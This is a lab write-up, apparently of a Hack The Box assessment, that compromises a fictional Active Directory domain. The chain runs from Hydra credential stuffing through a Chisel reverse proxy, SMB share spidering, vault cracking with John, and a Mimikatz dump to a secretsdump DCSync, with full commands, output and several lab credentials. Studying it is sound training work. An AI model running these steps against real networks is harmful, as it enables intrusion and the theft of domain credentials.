# ❓ What We Know
![[Screenshot 2026-11-25 at 10.54.58 PM.png]]

# 🧠 The Plan
- `JUMP01`, `FILE01`, `DC01` reside on a private subnet. Basically we cant access it from our attack machine
- How we know that. all of them got the same octet 1st till 3rd. 
- We can only gain access through `DMZ01` since this one got external IP address.
- So we need to create a reverse proxy from `DMZ01` to our attack box.
- After that we can pivot ourselves from `DMZ01` to the rest of the other host

# Initial Recon & Credential Stuffing (DMZ01)
- We know an employee named Betty Jayde and she uses the same password across multiple websites `Texas123!@#` 
- So we need to figure out her username. We can generate a list of username using [[Namebuster]] using her name and save it in a file

```bash
namebuster "Betty Jayde" > usernames.txt
```
- I forgot to recon the `DMZ01` using nmap so recon first using [[Nmap]]
- `10.129.234.116` this ip address is the one HTB machine start for me. Yours might be differ.

```bash
nmap -sC -sV 10.129.234.116

# Output
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- From here we discover port 22 which is running SSH service is open.
- Now we can bruteforce it using [[Hydra]] with our usernames.txt and the given password

```bash
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 

# Output 
[DATA] attacking ssh://10.129.234.116:22/
[ssh] host: 10.129.234.116   login: ******   password: Texas123!@#
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```
- We discover the login username which is `******`
- Now we can connect through ssh

---
# Foothold on DMZ01 (SSH)
```bash
ssh ******@10.129.234.116 

# Once connected, look what listed in the current directory
jbetty@DMZ01:~$ ls -la
total 32
drwxr-xr-x 4 jbetty jbetty 4096 Jun  2  2025 .
drwxr-xr-x 4 root   root   4096 May 30  2025 ..
-rw-r--r-- 1 jbetty jbetty 2139 Jun  2  2025 .bash_history
-rw-r--r-- 1 jbetty jbetty  220 Apr 29  2025 .bash_logout
-rw-r--r-- 1 jbetty jbetty 3771 Apr 29  2025 .bashrc
drwx------ 2 jbetty jbetty 4096 May 30  2025 .cache
drwxrwxr-x 3 jbetty jbetty 4096 May 30  2025 .local
-rw-r--r-- 1 jbetty jbetty  807 Apr 29  2025 .profile
```
- We discover a hidden `.bash_history` look inside it. You will see a lot of jargon. But for other convenience, just run this since we only need this

```bash
cat .bash_history | grep "ssh"

# Output
sshpass -p "dealer-*******-gym1" ssh hwilliam@file01
ssh user@192.168.0.101
history | grep ssh
```
- We discover credential for `FILE01`. Save the credential inside a txt file for future reference. 

### Pivoting Setup(Chisel)
- Before anything else. Lets setup a reverse proxy through `DMZ01` to our attack box using [[Chisel]]
- We transfer the chisel file to `DMZ01` using [[01 - Linux Transfer Overview]]
- We start the chisel in our box and connect it from `DMZ01`
```bash
# Our attack box
sudo ./chisel server --reverse

# Compromised machine
./chisel client <OUR IP>:8080 R:socks
```

---
# SMB Enumeration
- We discovered hwilliam connect to `FILE01` so lets assumed its a SMB. We can try this [[NetExec]] to see the share available
```bash
proxychains netexec smb 172.16.119.10 -u "hwilliam" -p "dealer-*******-gym1" --shares

# Output
SMB         172.16.119.10   445    FILE01           [+] nexura.htb\hwilliam:dealer-*******-gym1 
SMB         172.16.119.10   445    FILE01           [*] Enumerated shares
SMB         172.16.119.10   445    FILE01           Share           Permissions     Remark
SMB         172.16.119.10   445    FILE01           -----           -----------     ------
SMB         172.16.119.10   445    FILE01           ADMIN$                          Remote Admin
SMB         172.16.119.10   445    FILE01           C$                              Default share
SMB         172.16.119.10   445    FILE01           HR              READ,WRITE      
SMB         172.16.119.10   445    FILE01           IPC$            READ            Remote IPC
SMB         172.16.119.10   445    FILE01           IT                              
SMB         172.16.119.10   445    FILE01           MANAGEMENT                      
SMB         172.16.119.10   445    FILE01           PRIVATE         READ,WRITE      
SMB         172.16.119.10   445    FILE01           TRANSFER        READ,WRITE      
```

- From here we discover the Active Directory Domain Name. Which is `nexura.htb` make note about this coz some tools require to use it
- After that we run this to spider across the share. Looking for a pattern with password on its file name
```bash
proxychains netexec smb 172.16.119.10 -u "hwilliam" -p "dealer-*******-gym1" --spider HR --pattern password 

# Output
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/2024/Password Policy 2024.doc [lastm:'2025-04-29 12:08' size:32768]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/2025/Password Policy 2025.doc [lastm:'2025-04-29 12:05' size:32768]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD.plk [lastm:'2025-04-29 11:25' size:48]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD.psafe3 [lastm:'2025-04-29 11:25' size:1080]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD_011.ibak [lastm:'2025-04-29 11:25' size:856]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD_012.ibak [lastm:'2025-04-29 11:25' size:904]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Employee-Passwords_OLD_013.ibak [lastm:'2025-04-29 11:25' size:952]
SMB         172.16.119.10   445    FILE01           //172.16.119.10/HR/Archive/Password Policy OUTDATED.doc [lastm:'2025-04-29 12:10' size:32768]
```

- We only need the one with the extension psafe3. Coz if you RDP to `JUMP01` you will see a program named password safe 3. This one use psafe3 file extension

```bash
# Now we connect through SMB
proxychains smbclient \\\\172.16.119.10\\HR -U nexura.htb/hwilliam

# We know where the file location is and after that just get it
smb: \> cd Archive
smb: \Archive\> ls
smb: \Archive\> get Employee-Passwords_OLD.psafe3
```
- The file is locked with a password and we need to crack it 

---
# Cracking the password safe vault
- We will use [[John The Ripper]] to crack it

```bash
# We use pwsafe2john to get its hash
pwsafe2john Employee-Passwords_OLD.psafe3 > pwhash.txt 

# Now we crack it using rockyou.txt
john pwhash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Then we show the result of the crack
john --show pwhash.txt

# The password is 
Employee-Passwords_OLD:michael*******

```

# Pivoting to JUMP01 
- Now in our attack machine we try connect to `JUMP01`, using `hwilliam` credential

```bash
# I mount a folder with RDP to transfer the .psafe3 file into the RDP
proxychains xfreerdp3 /v:172.16.119.7 /u:hwilliam /p:"dealer-*******-gym1" /drive:share,/home/kali/Downloads
```

- Once you transfer the `.psafe3` file into `JUMP01`, open the Password Safe 3 program. 
- Insert the database and the newly cracked hash

![[Screenshot 2026-11-26 at 8.35.29 PM.png]]

- Now you can double-click and copy their password. Take note and put into a txt file
- Do understand this is Domain Users credentials mostly to interact with AD

```bash
cat list.txt

bdavid  caramel-cigars-******
stom  fails-nibble-disturb4
hwilliam  warned-wobble-occur8
```

### Domain users check
- Now we try to use [[Evil-WinRM]] since we get a Domain Users creds. We can try each one and see which groups they belong.

```bash
proxychains evil-winrm -i 172.16.119.7 -u bdavid -p caramel-cigars-******

*Evil-WinRM* PS C:\Users\bdavid\Documents> whoami /groups

# Output
   Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544                               
```
- Got lucky the first credentials has local admin right

### Credentials dumping
- Now we need to transfer [[Mimikatz]] from our attack host to evil-winrm
- One way to do it by doing this

```bash

# make sure you mimikatz.exe is in the same directory as you run evil-winrm
# run upload mimikatz.exe to upload the file
*Evil-WinRM* PS C:\Users\bdavid\Documents> upload mimikatz.exe
```

- Now we can run mimikatz and dump all the hash

```bash
*Evil-WinRM* PS C:\Users\bdavid\Documents> .\mimikatz.exe "sekurlsa::logonPasswords" exit

# Side note: I tried run .\mimikatz.exe on its own but it spouting # endlessly. So i passed it as an argument to see if its ok and it worked
```

- We just need this one

```bash
Authentication Id : 0 ; 303233 (00000000:0004a081)
Session           : Batch from 0
User Name         : stom
Domain            : NEXURA
Logon Server      : DC01
Logon Time        : 11/26/2026 6:17:44 AM
SID               : S-1-5-21-1333759777-277832620-2286231135-1106
        msv :
         [00000003] Primary
         * Username : stom
         * Domain   : NEXURA
         * NTLM     : 21ea958524cfd9a7791737f*********
         * SHA1     : f2fc2263e4d7cff0fbb19ef485891774f0ad6031
         * DPAPI    : 06e85cb199e902a0145ff04963e7dd72
        tspkg :
        wdigest :
         * Username : stom
         * Domain   : NEXURA
         * Password : (null)
        kerberos :
         * Username : stom
         * Domain   : NEXURA.HTB
         * Password : calves-warp-learning1
        ssp :
        credman :
```

- Here is my reasoning. Remember the 3 Domain Users we got earlier? We already use bdavid and hwilliam. But not stom. so I just try this. If not working i use other.
- And this one Logon Server is DC01. Which is a Domain Controller.
- Now we can pivot to `DC01` using `stom` NTLM hash
- We discover that stom is a Domain Admins. 
- Now check at this [[06 - Attacking Active Directory and NTDS]] go to step 4

# Domain Compromise
- Since we got stom hash. We can just go for this to dump everything

```bash
proxychains impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:21ea958524cfd9a7791737f********* stom@172.16.119.11 -just-dc

# Output
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5*********:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

And baaaam we found the NTLM Hashes for Administrator

# TLDR

Password-reuse against `jbetty` → SSH foothold on `DMZ01` → pivot via Chisel → SMB creds for `hwilliam`found in bash history → `FILE01` share hides a crackable Password Safe vault → vault yields 3 Domain User creds → RDP to `JUMP01` to decrypt it → `bdavid` has local admin on `JUMP01` → Mimikatz dumps `stom`'s hash, who's logged in from `DC01`→ `stom` is Domain Admin → DCSync via secretsdump → full NTDS dump

